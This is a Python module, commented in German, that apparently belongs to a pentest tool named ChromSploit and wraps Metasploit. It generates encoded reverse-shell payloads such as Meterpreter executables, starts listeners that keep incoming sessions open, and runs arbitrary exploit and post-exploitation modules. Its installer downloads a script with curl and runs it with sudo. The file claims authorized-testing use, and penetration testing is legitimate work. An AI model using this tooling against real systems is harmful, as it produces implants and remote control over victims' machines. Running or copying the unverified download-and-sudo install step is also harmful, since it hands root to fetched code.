#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ChromSploit Framework v2.0
Metasploit Framework Integration
Für Bildungs- und autorisierte Penetrationstests
"""

import os
import sys
import time
import json
import subprocess
import tempfile
from typing import Dict, List, Any, Optional, Tuple, Union

from core.colors import Colors
from core.logger import Logger
from core.utils import Utils
from core.path_utils import PathUtils

class MetasploitIntegration:
    """
    Integration des Metasploit Frameworks in ChromSploit
    """
    
    def __init__(self, logger: Optional[Logger] = None):
        """
        Initialisiert die Metasploit-Integration
        
        Args:
            logger (Logger, optional): Logger-Instanz
        """
        self.logger = logger
        self.msf_path = "/opt/metasploit-framework"
        self.msfvenom_path = "/opt/metasploit-framework/msfvenom"
        self.msfconsole_path = "/opt/metasploit-framework/msfconsole"
        self.active_handlers = []
        self.generated_payloads = []
    
    def log(self, level: str, message: str) -> None:
        """
        Loggt eine Nachricht
        
        Args:
            level (str): Log-Level
            message (str): Nachricht
        """
        if self.logger:
            if level == "info":
                self.logger.info(message)
            elif level == "warning":
                self.logger.warning(message)
            elif level == "error":
                self.logger.error(message)
            elif level == "debug":
                self.logger.debug(message)
        else:
            print(f"{Colors.BLUE}[*] {message}{Colors.RESET}" if level == "info" else
                  f"{Colors.YELLOW}[!] {message}{Colors.RESET}" if level == "warning" else
                  f"{Colors.RED}[-] {message}{Colors.RESET}" if level == "error" else
                  f"{Colors.MAGENTA}[D] {message}{Colors.RESET}")
    
    def is_available(self) -> bool:
        """
        Überprüft, ob Metasploit verfügbar ist
        
        Returns:
            bool: True, wenn Metasploit verfügbar ist, sonst False
        """
        return os.path.exists(self.msfvenom_path) or Utils.is_tool_available("msfvenom")
    
    def get_version(self) -> str:
        """
        Gibt die Metasploit-Version zurück
        
        Returns:
            str: Die Metasploit-Version oder "Unbekannt" bei Fehler
        """
        try:
            if os.path.exists(self.msfvenom_path):
                result = subprocess.run([self.msfvenom_path, "--version"], 
                                     capture_output=True, text=True, timeout=10)
                return result.stdout.strip()
            elif Utils.is_tool_available("msfvenom"):
                result = subprocess.run(["msfvenom", "--version"], 
                                     capture_output=True, text=True, timeout=10)
                return result.stdout.strip()
            return "Nicht verfügbar"
        except Exception as e:
            self.log("error", f"Fehler beim Abrufen der Metasploit-Version: {str(e)}")
            return "Unbekannt"
    
    def install(self) -> bool:
        """
        Installiert Metasploit, falls es nicht verfügbar ist
        
        Returns:
            bool: True bei erfolgreicher Installation, sonst False
        """
        if self.is_available():
            self.log("info", "Metasploit ist bereits installiert")
            return True
        
        self.log("info", "Installiere Metasploit Framework...")
        
        try:
            # Metasploit-Installationsscript herunterladen
            self.log("info", "Lade Metasploit-Installationsscript herunter...")
            download_cmd = "curl -s https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall"
            result = subprocess.run(download_cmd, shell=True, check=True, 
                                  stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            # Ausführungsrechte setzen
            chmod_cmd = "chmod +x msfinstall"
            subprocess.run(chmod_cmd, shell=True, check=True)
            
            # Metasploit installieren
            self.log("info", "Führe Metasploit-Installationsscript aus...")
            install_cmd = "sudo ./msfinstall"
            subprocess.run(install_cmd, shell=True, check=True)
            
            # Aufräumen
            cleanup_cmd = "rm msfinstall"
            subprocess.run(cleanup_cmd, shell=True, check=True)
            
            # Überprüfen, ob die Installation erfolgreich war
            if self.is_available():
                self.log("info", "Metasploit wurde erfolgreich installiert")
                return True
            else:
                self.log("error", "Metasploit-Installation fehlgeschlagen")
                return False
        except Exception as e:
            self.log("error", f"Fehler bei der Metasploit-Installation: {str(e)}")
            return False
    
    def generate_payload(self, 
                        payload_type: str = "windows/meterpreter/reverse_https", 
                        lhost: str = "127.0.0.1", 
                        lport: int = 4444,
                        format_type: str = "exe",
                        encoder: Optional[str] = None,
                        iterations: int = 1,
                        platform: Optional[str] = None,
                        arch: Optional[str] = None,
                        output_path: Optional[str] = None) -> Optional[str]:
        """
        Generiert einen Metasploit-Payload
        
        Args:
            payload_type (str, optional): Payload-Typ
            lhost (str, optional): Listener-Host
            lport (int, optional): Listener-Port
            format_type (str, optional): Ausgabeformat
            encoder (str, optional): Encoder
            iterations (int, optional): Anzahl der Encoding-Iterationen
            platform (str, optional): Plattform
            arch (str, optional): Architektur
            output_path (str, optional): Ausgabepfad für den Payload
            
        Returns:
            str: Pfad zum generierten Payload oder None bei Fehler
        """
        if not self.is_available():
            self.log("error", "Metasploit ist nicht verfügbar")
            return None
        
        self.log("info", f"Generiere Metasploit-Payload {payload_type} für {lhost}:{lport}...")
        
        # Befehl zum Generieren des Payloads erstellen
        cmd = [self.msfvenom_path if os.path.exists(self.msfvenom_path) else "msfvenom",
              "-p", payload_type,
              "LHOST=" + lhost,
              "LPORT=" + str(lport),
              "-f", format_type]
        
        # Encoder hinzufügen, falls angegeben
        if encoder:
            cmd.extend(["-e", encoder])
            cmd.extend(["-i", str(iterations)])
        
        # Plattform hinzufügen, falls angegeben
        if platform:
            cmd.extend(["--platform", platform])
        
        # Architektur hinzufügen, falls angegeben
        if arch:
            cmd.extend(["-a", arch])
        
        # Ausgabepfad festlegen
        if not output_path:
            output_dir = os.path.join(PathUtils.get_output_dir(), "metasploit")
            PathUtils.ensure_dir_exists(output_dir)
            
            # Dateierweiterung basierend auf Format
            if format_type == "exe":
                ext = "exe"
            elif format_type == "dll":
                ext = "dll"
            elif format_type == "powershell":
                ext = "ps1"
            elif format_type == "raw":
                ext = "bin"
            elif format_type == "python":
                ext = "py"
            elif format_type == "bash":
                ext = "sh"
            else:
                ext = format_type
            
            output_path = os.path.join(output_dir, f"msf_payload_{payload_type.replace('/', '_')}_{lport}.{ext}")
        
        cmd.extend(["-o", output_path])
        
        try:
            # Payload generieren
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0:
                self.log("info", f"Metasploit-Payload erfolgreich generiert: {output_path}")
                
                # Payload zur Liste hinzufügen
                self.generated_payloads.append({
                    "path": output_path,
                    "type": payload_type,
                    "lhost": lhost,
                    "lport": lport,
                    "format": format_type,
                    "encoder": encoder,
                    "iterations": iterations,
                    "platform": platform,
                    "arch": arch
                })
                
                return output_path
            else:
                self.log("error", f"Fehler beim Generieren des Metasploit-Payloads: {result.stderr}")
                return None
        except Exception as e:
            self.log("error", f"Fehler beim Generieren des Metasploit-Payloads: {str(e)}")
            return None
    
    def start_handler(self, 
                     payload_type: str = "windows/meterpreter/reverse_https", 
                     lhost: str = "0.0.0.0", 
                     lport: int = 4444,
                     persistent: bool = True) -> bool:
        """
        Startet einen Metasploit-Handler
        
        Args:
            payload_type (str, optional): Payload-Typ
            lhost (str, optional): Listener-Host
            lport (int, optional): Listener-Port
            persistent (bool, optional): Ob der Handler persistent sein soll
            
        Returns:
            bool: True bei Erfolg, sonst False
        """
        if not self.is_available():
            self.log("error", "Metasploit ist nicht verfügbar")
            return False
        
        self.log("info", f"Starte Metasploit-Handler für {payload_type} auf {lhost}:{lport}...")
        
        # RC-Datei für den Handler erstellen
        rc_content = f"""
use exploit/multi/handler
set PAYLOAD {payload_type}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j -z
"""
        
        # Temporäre RC-Datei erstellen
        with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.rc') as temp:
            temp.write(rc_content)
            rc_path = temp.name
        
        # Befehl zum Starten des Handlers erstellen
        cmd = [self.msfconsole_path if os.path.exists(self.msfconsole_path) else "msfconsole",
              "-q", "-r", rc_path]
        
        try:
            # Handler starten
            if persistent:
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(5)  # Kurz warten, um zu sehen, ob der Handler startet
                
                # Überprüfen, ob der Prozess noch läuft
                if process.poll() is None:
                    self.log("info", f"Metasploit-Handler für {payload_type} erfolgreich gestartet auf {lhost}:{lport}")
                    
                    # Handler zur Liste hinzufügen
                    self.active_handlers.append({
                        "payload_type": payload_type,
                        "lhost": lhost,
                        "lport": lport,
                        "process": process,
                        "rc_path": rc_path
                    })
                    
                    return True
                else:
                    stdout, stderr = process.communicate()
                    self.log("error", f"Fehler beim Starten des Metasploit-Handlers: {stderr.decode()}")
                    
                    # RC-Datei löschen
                    os.unlink(rc_path)
                    
                    return False
            else:
                result = subprocess.run(cmd, capture_output=True, text=True)
                
                # RC-Datei löschen
                os.unlink(rc_path)
                
                if result.returncode == 0:
                    self.log("info", f"Metasploit-Handler für {payload_type} erfolgreich gestartet auf {lhost}:{lport}")
                    return True
                else:
                    self.log("error", f"Fehler beim Starten des Metasploit-Handlers: {result.stderr}")
                    return False
        except Exception as e:
            self.log("error", f"Fehler beim Starten des Metasploit-Handlers: {str(e)}")
            
            # RC-Datei löschen
            try:
                os.unlink(rc_path)
            except:
                pass
            
            return False
    
    def stop_handler(self, lport: int) -> bool:
        """
        Stoppt einen Metasploit-Handler
        
        Args:
            lport (int): Listener-Port
            
        Returns:
            bool: True bei Erfolg, sonst False
        """
        for i, handler in enumerate(self.active_handlers):
            if handler["lport"] == lport:
                if "process" in handler:
                    try:
                        handler["process"].terminate()
                        handler["process"].wait(timeout=5)
                        self.log("info", f"Metasploit-Handler auf Port {lport} gestoppt")
                        
                        # RC-Datei löschen
                        if "rc_path" in handler and os.path.exists(handler["rc_path"]):
                            os.unlink(handler["rc_path"])
                        
                        self.active_handlers.pop(i)
                        return True
                    except Exception as e:
                        self.log("error", f"Fehler beim Stoppen des Metasploit-Handlers: {str(e)}")
                        return False
                else:
                    self.log("warning", f"Kein Prozess für Handler auf Port {lport} gefunden")
                    self.active_handlers.pop(i)
                    return True
        
        self.log("warning", f"Kein aktiver Handler auf Port {lport} gefunden")
        return False
    
    def stop_all_handlers(self) -> bool:
        """
        Stoppt alle aktiven Metasploit-Handler
        
        Returns:
            bool: True bei Erfolg, sonst False
        """
        success = True
        
        for handler in self.active_handlers[:]:
            if "process" in handler:
                try:
                    handler["process"].terminate()
                    handler["process"].wait(timeout=5)
                    self.log("info", f"Metasploit-Handler auf Port {handler['lport']} gestoppt")
                    
                    # RC-Datei löschen
                    if "rc_path" in handler and os.path.exists(handler["rc_path"]):
                        os.unlink(handler["rc_path"])
                except Exception as e:
                    self.log("error", f"Fehler beim Stoppen des Metasploit-Handlers: {str(e)}")
                    success = False
        
        self.active_handlers = []
        return success
    
    def get_active_handlers(self) -> List[Dict[str, Any]]:
        """
        Gibt alle aktiven Metasploit-Handler zurück
        
        Returns:
            list: Liste der aktiven Handler
        """
        # Aktualisieren der Handler-Liste, um zu überprüfen, ob alle noch aktiv sind
        for i, handler in enumerate(self.active_handlers[:]):
            if "process" in handler and handler["process"].poll() is not None:
                self.log("warning", f"Handler auf Port {handler['lport']} ist nicht mehr aktiv")
                self.active_handlers.pop(i)
        
        return self.active_handlers
    
    def get_available_payloads(self, platform: Optional[str] = None) -> List[str]:
        """
        Gibt alle verfügbaren Metasploit-Payloads zurück
        
        Args:
            platform (str, optional): Plattform (windows, linux, osx, android)
            
        Returns:
            list: Liste der verfügbaren Payloads
        """
        if not self.is_available():
            self.log("error", "Metasploit ist nicht verfügbar")
            return []
        
        try:
            # Befehl zum Abrufen der verfügbaren Payloads erstellen
            cmd = [self.msfvenom_path if os.path.exists(self.msfvenom_path) else "msfvenom",
                  "--list", "payloads"]
            
            # Payloads abrufen
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                payloads = []
                
                # Payloads parsen
                for line in result.stdout.split('\n'):
                    if '/' in line:
                        payload = line.split()[0].strip()
                        
                        # Nach Plattform filtern, falls angegeben
                        if platform:
                            if platform.lower() == "windows" and payload.startswith("windows/"):
                                payloads.append(payload)
                            elif platform.lower() == "linux" and payload.startswith("linux/"):
                                payloads.append(payload)
                            elif platform.lower() == "osx" and payload.startswith("osx/"):
                                payloads.append(payload)
                            elif platform.lower() == "android" and payload.startswith("android/"):
                                payloads.append(payload)
                        else:
                            payloads.append(payload)
                
                return payloads
            else:
                self.log("error", f"Fehler beim Abrufen der verfügbaren Payloads: {result.stderr}")
                return []
        except Exception as e:
            self.log("error", f"Fehler beim Abrufen der verfügbaren Payloads: {str(e)}")
            return []
    
    def get_available_encoders(self) -> List[str]:
        """
        Gibt alle verfügbaren Metasploit-Encoder zurück
        
        Returns:
            list: Liste der verfügbaren Encoder
        """
        if not self.is_available():
            self.log("error", "Metasploit ist nicht verfügbar")
            return []
        
        try:
            # Befehl zum Abrufen der verfügbaren Encoder erstellen
            cmd = [self.msfvenom_path if os.path.exists(self.msfvenom_path) else "msfvenom",
                  "--list", "encoders"]
            
            # Encoder abrufen
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                encoders = []
                
                # Encoder parsen
                for line in result.stdout.split('\n'):
                    if '/' in line:
                        encoder = line.split()[0].strip()
                        encoders.append(encoder)
                
                return encoders
            else:
                self.log("error", f"Fehler beim Abrufen der verfügbaren Encoder: {result.stderr}")
                return []
        except Exception as e:
            self.log("error", f"Fehler beim Abrufen der verfügbaren Encoder: {str(e)}")
            return []
    
    def get_available_formats(self) -> List[str]:
        """
        Gibt alle verfügbaren Metasploit-Ausgabeformate zurück
        
        Returns:
            list: Liste der verfügbaren Ausgabeformate
        """
        if not self.is_available():
            self.log("error", "Metasploit ist nicht verfügbar")
            return []
        
        try:
            # Befehl zum Abrufen der verfügbaren Ausgabeformate erstellen
            cmd = [self.msfvenom_path if os.path.exists(self.msfvenom_path) else "msfvenom",
                  "--list", "formats"]
            
            # Ausgabeformate abrufen
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                formats = []
                
                # Ausgabeformate parsen
                for line in result.stdout.split('\n'):
                    if line.strip() and not line.startswith('Name') and not line.startswith('----'):
                        format_name = line.split()[0].strip()
                        formats.append(format_name)
                
                return formats
            else:
                self.log("error", f"Fehler beim Abrufen der verfügbaren Ausgabeformate: {result.stderr}")
                return []
        except Exception as e:
            self.log("error", f"Fehler beim Abrufen der verfügbaren Ausgabeformate: {str(e)}")
            return []
    
    def run_metasploit_module(self, 
                             module_type: str, 
                             module_name: str, 
                             options: Dict[str, str]) -> Tuple[bool, str]:
        """
        Führt ein Metasploit-Modul aus
        
        Args:
            module_type (str): Modultyp (exploit, auxiliary, post)
            module_name (str): Modulname
            options (dict): Moduloptionen
            
        Returns:
            tuple: (Erfolg, Ausgabe)
        """
        if not self.is_available():
            self.log("error", "Metasploit ist nicht verfügbar")
            return False, "Metasploit ist nicht verfügbar"
        
        self.log("info", f"Führe Metasploit-Modul {module_type}/{module_name} aus...")
        
        # RC-Datei für das Modul erstellen
        rc_content = f"use {module_type}/{module_name}\n"
        
        # Optionen hinzufügen
        for option, value in options.items():
            rc_content += f"set {option} {value}\n"
        
        rc_content += "run\n"
        
        # Temporäre RC-Datei erstellen
        with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.rc') as temp:
            temp.write(rc_content)
            rc_path = temp.name
        
        # Befehl zum Ausführen des Moduls erstellen
        cmd = [self.msfconsole_path if os.path.exists(self.msfconsole_path) else "msfconsole",
              "-q", "-r", rc_path]
        
        try:
            # Modul ausführen
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            # RC-Datei löschen
            os.unlink(rc_path)
            
            if result.returncode == 0:
                self.log("info", f"Metasploit-Modul {module_type}/{module_name} erfolgreich ausgeführt")
                return True, result.stdout
            else:
                self.log("error", f"Fehler beim Ausführen des Metasploit-Moduls: {result.stderr}")
                return False, result.stderr
        except Exception as e:
            self.log("error", f"Fehler beim Ausführen des Metasploit-Moduls: {str(e)}")
            
            # RC-Datei löschen
            try:
                os.unlink(rc_path)
            except:
                pass
            
            return False, str(e)
